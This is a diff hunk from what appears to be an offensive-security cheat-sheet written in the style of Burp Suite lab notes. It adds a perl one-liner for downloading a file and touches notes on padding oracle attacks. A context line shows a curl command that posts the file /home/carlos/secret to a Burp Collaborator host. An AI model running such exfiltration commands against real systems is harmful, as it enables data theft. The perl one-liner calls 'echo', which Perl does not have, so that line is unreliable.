@@ -328,6 +328,10 @@ if you have a server or burp collaborator-like functionality, you can retrieve p
 
 `curl -X POST -F test=@/home/carlos/secret http://pohwe4zygesamfa7r5y0nutip9v1jq.burpcollaborator.net`
 
+Downloading a file with perl
+
+`perl -e 'use LWP::Simple qw(get); echo(get "http://www.grislygrotto.nz")'`
+
 ## Padding oracle attacks
 
 use https://github.com/AonCyberLabs/PadBuster
